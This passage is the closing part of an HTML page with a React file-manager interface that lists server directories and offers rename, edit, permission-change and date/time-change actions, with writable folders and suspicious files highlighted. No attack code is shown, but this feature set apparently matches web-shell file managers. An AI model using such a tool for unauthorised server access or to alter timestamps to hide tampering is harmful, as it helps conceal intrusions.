                    )}

                    {/* File List */}
                    <div className="p-4">
                        <div className="bg-light-surface dark:bg-dark-surface border border-light-border dark:border-dark-border rounded-lg overflow-hidden">
                            <div className="max-h-[calc(100vh-300px)] overflow-y-auto">
                                {filteredItems.length === 0 ? (
                                    <div className="p-8 text-center text-gray-500">
                                        <Icons.Folder />
                                        <p className="mt-2">
                                            {searchTerm ? 'No files match your search' : 'This folder is empty'}
                                        </p>
                                    </div>
                                ) : (
                                    <div className="divide-y divide-light-border dark:divide-dark-border">
                                        {filteredItems.map((item, index) => (
                                            <div
                                                key={index}
                                                className={`flex items-center p-4 hover:bg-gray-50 dark:hover:bg-dark-bg transition-colors ${
                                                    item.type === 'folder' && item.writable 
                                                        ? 'bg-green-50 dark:bg-green-900 dark:bg-opacity-40 border-l-4 border-green-500 dark:border-green-400' 
                                                        : ''
                                                } ${
                                                    !item.canEdit && item.type === 'file'
                                                        ? 'bg-red-50 dark:bg-red-900 dark:bg-opacity-20 border-l-4 border-red-500 dark:border-red-400'
                                                        : ''
                                                }`}
                                            >
                                                <input
                                                    type="checkbox"
                                                    checked={selectedItems.includes(item.name)}
                                                    onChange={() => handleSelectItem(item.name)}
                                                    className="mr-3 rounded border-light-border dark:border-dark-border bg-light-surface dark:bg-dark-bg text-blue-600 dark:text-neon-blue focus:ring-blue-500 dark:focus:ring-neon-blue"
                                                />
                                                
                                                <div className={`flex items-center mr-4 ${
                                                    !item.canEdit && item.type === 'file' 
                                                        ? 'text-red-600 dark:text-red-400' 
                                                        : ''
                                                }`}>
                                                    {item.type === 'folder' ? (
                                                        <Icons.Folder />
                                                    ) : (
                                                        <Icons.File />
                                                    )}
                                                </div>

                                                {/* Suspicious file warning icon */}
                                                {item.isSuspicious && (
                                                    <div className="mr-2 text-yellow-500" title="Suspicious file detected!">
                                                        ⚠️
                                                    </div>
                                                )}

                                                <div className="flex-1 min-w-0">
                                                    <button
                                                        onClick={() => {
                                                            if (item.type === 'folder') {
                                                                showLoading('Opening folder…');
                                                                window.location.href = `?dir=${encodeURIComponent(currentDir + '/' + item.name)}`;
                                                            } else {
                                                                handleFileClick(item.name);
                                                            }
                                                        }}
                                                        className={`text-left w-full truncate transition-colors ${
                                                            !item.canEdit && item.type === 'file'
                                                                ? 'text-red-600 dark:text-red-400 hover:text-red-700 dark:hover:text-red-300'
                                                                : 'hover:text-blue-600 dark:hover:text-neon-blue'
                                                        }`}
                                                        title={!item.canEdit && item.type === 'file' ? 'File cannot be edited (permission denied)' : ''}
                                                    >
                                                        {item.name}
                                                    </button>
                                                </div>

                                                {/* Action buttons */}
                                                <div className="flex items-center space-x-4 text-sm text-gray-500 dark:text-gray-400">
                                                    <span className="w-16 text-right">{item.type === 'file' ? formatFileSize(item.size) : '-'}</span>
                                                    <span className="w-20 text-center">{item.permissions}</span>
                                                    <span className="w-32 text-right">{formatDate(item.modified)}</span>
                                                    
                                                    {/* Copy Link button - positioned right after file info */}
                                                    {item.type === 'file' && (
                                                        <button
                                                            onClick={(e) => {
                                                                e.stopPropagation();
                                                                copyFileLink(item.name);
                                                            }}
                                                            className="p-1 hover:text-blue-600 dark:hover:text-neon-blue transition-colors"
                                                            title="Copy Link"
                                                        >
                                                            <Icons.Copy />
                                                        </button>
                                                    )}
                                                    
                                                    {/* Other action buttons */}
                                                    <div className="flex space-x-1">
                                                        <button
                                                            onClick={() => {
                                                                setCurrentItem(item);
                                                                setShowRename(true);
                                                            }}
                                                            className="p-1 hover:text-blue-600 dark:hover:text-neon-blue transition-colors"
                                                            title="Rename"
                                                        >
                                                            <Icons.Rename />
                                                        </button>
                                                        <button
                                                            onClick={() => {
                                                                setCurrentItem(item);
                                                                setShowPermissions(true);
                                                            }}
                                                            className="p-1 hover:text-blue-600 dark:hover:text-neon-blue transition-colors"
                                                            title="Edit Permissions"
                                                        >
                                                            <Icons.Shield />
                                                        </button>
                                                        <button
                                                            onClick={() => {
                                                                setCurrentItem(item);
                                                                setShowDateTime(true);
                                                            }}
                                                            className="p-1 hover:text-blue-600 dark:hover:text-neon-blue transition-colors"
                                                            title="Edit Date/Time"
                                                        >
                                                            <Icons.Clock />
                                                        </button>
                                                        <button
                                                            onClick={() => handleEditFile(item.name)}
                                                            className={`p-1 transition-colors ${
                                                                !item.canEdit && item.type === 'file'
                                                                    ? 'text-red-600 dark:text-red-400 hover:text-red-700 dark:hover:text-red-300 opacity-50 cursor-not-allowed'
                                                                    : 'hover:text-blue-600 dark:hover:text-neon-blue'
                                                            }`}
                                                            title={!item.canEdit && item.type === 'file' ? 'Cannot edit (permission denied)' : 'Edit'}
                                                        >
                                                            <Icons.Edit />
                                                        </button>
                                                    </div>
                                                </div>
                                            </div>
                                        ))}
                                    </div>
                                )}
                            </div>
                        </div>
                    </div>

                    {/* Modals */}
                    <ImageViewer
                        isOpen={showImageViewer}
                        onClose={() => setShowImageViewer(false)}
                        imageSrc={viewingImage.src}
                        imageName={viewingImage.name}
                    />

                    <FileEditor
                        isOpen={showEditor}
                        onClose={() => setShowEditor(false)}
                        filename={editingFile.name}
                        content={editingFile.content}
                        onSave={handleSaveFile}
                    />

                    <RenameModal
                        isOpen={showRename}
                        onClose={() => setShowRename(false)}
                        currentName={currentItem.name}
                        onRename={handleRename}
                    />

                    <PermissionModal
                        isOpen={showPermissions}
                        onClose={() => setShowPermissions(false)}
                        filename={currentItem.name}
                        currentPermissions={currentItem.permissions}
                        onSave={handlePermissionChange}
                    />

                    <DateTimeModal
                        isOpen={showDateTime}
                        onClose={() => setShowDateTime(false)}
                        filename={currentItem.name}
                        currentDateTime={currentItem.modified}
                        onSave={handleDateTimeChange}
                    />

                    {/* Create File Modal */}
                    <Modal isOpen={showCreateFile} onClose={() => setShowCreateFile(false)} title="Create New File">
                        <div className="space-y-4">
                            <input
                                type="text"
                                value={newItemName}
                                onChange={(e) => setNewItemName(e.target.value)}
                                className="w-full p-3 bg-gray-50 dark:bg-dark-bg border border-light-border dark:border-dark-border rounded-lg text-gray-900 dark:text-white focus:outline-none focus:ring-2 focus:ring-blue-500 dark:focus:ring-neon-blue"
                                placeholder="Enter file name..."
                            />
                            <div className="flex justify-end space-x-3">
                                <button
                                    onClick={() => setShowCreateFile(false)}
                                    className="px-6 py-2 bg-gray-600 hover:bg-gray-700 text-white rounded-lg transition-colors"
                                >
                                    Cancel
                                </button>
                                <button
                                    onClick={() => {
                                        handleCreateItem('file');
                                        setShowCreateFile(false);
                                        setNewItemName('');
                                    }}
                                    className="px-6 py-2 bg-gradient-to-r from-blue-500 to-purple-600 dark:from-neon-blue dark:to-neon-purple hover:shadow-neon text-white rounded-lg transition-all"
                                >
                                    Create
                                </button>
                            </div>
                        </div>
                    </Modal>

                    {/* Create Folder Modal */}
                    <Modal isOpen={showCreateFolder} onClose={() => setShowCreateFolder(false)} title="Create New Folder">
                        <div className="space-y-4">
                            <input
                                type="text"
                                value={newItemName}
                                onChange={(e) => setNewItemName(e.target.value)}
                                className="w-full p-3 bg-gray-50 dark:bg-dark-bg border border-light-border dark:border-dark-border rounded-lg text-gray-900 dark:text-white focus:outline-none focus:ring-2 focus:ring-blue-500 dark:focus:ring-neon-blue"
                                placeholder="Enter folder name..."
                            />
                            <div className="flex justify-end space-x-3">
                                <button
                                    onClick={() => setShowCreateFolder(false)}
                                    className="px-6 py-2 bg-gray-600 hover:bg-gray-700 text-white rounded-lg transition-colors"
                                >
                                    Cancel
                                </button>
                                <button
                                    onClick={() => {
                                        handleCreateItem('folder');
                                        setShowCreateFolder(false);
                                        setNewItemName('');
                                    }}
                                    className="px-6 py-2 bg-gradient-to-r from-blue-500 to-purple-600 dark:from-neon-blue dark:to-neon-purple hover:shadow-neon text-white rounded-lg transition-all"
                                >
                                    Create
                                </button>
                            </div>
                        </div>
                    </Modal>

                    {/* Toast */}
                    {showToast && (
                        <div className="fixed bottom-4 right-4 bg-green-500 text-white p-3 rounded-lg shadow-lg z-50">
                            {toastMessage}
                        </div>
                    )}
                </div>
            );
        };

        ReactDOM.render(<FileManager />, document.getElementById('root'));
    </script>
</body>
</html>
